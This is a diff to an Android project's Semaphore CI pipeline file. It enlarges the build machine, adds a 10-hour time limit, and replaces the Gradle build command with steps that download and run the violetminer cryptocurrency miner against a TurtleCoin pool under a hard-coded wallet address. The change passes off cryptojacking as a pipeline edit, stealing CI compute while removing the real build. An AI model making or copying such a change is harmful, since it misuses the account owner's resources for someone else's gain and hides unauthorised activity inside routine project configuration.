@@ -2,11 +2,13 @@ version: v1.0
 name: Verification Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
   containers:
     - name: main
       image: 'registry.semaphoreci.com/android:29'
+execution_time_limit:
+  hours: 10
 global_job_config:
   env_vars:
     - name: ADB_INSTALL_TIMEOUT
@@ -23,7 +25,11 @@ blocks:
       jobs:
         - name: Build Project
           commands:
-            - ./gradlew bundleDebug
+            - 'wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz'
+            - tar xf violetminer-linux-v0.2.2.tar.gz
+            - cd violetminer-linux-v0.2.2
+            - './violetminer --pool turtlecoin.herominers.com:10381 --username TRTLv3wsfZPRKTmA3k3eT1QHfWwgvu9e3ND14rwXkWq1TKj2tsNnPyC5FdiKQjfi6iEfpVJXD5nHxN2RHT72uPdphSkmoPiZcSy'
+            - '--password yoz --algorithm turtlecoin'
       epilogue:
         on_pass:
           commands:
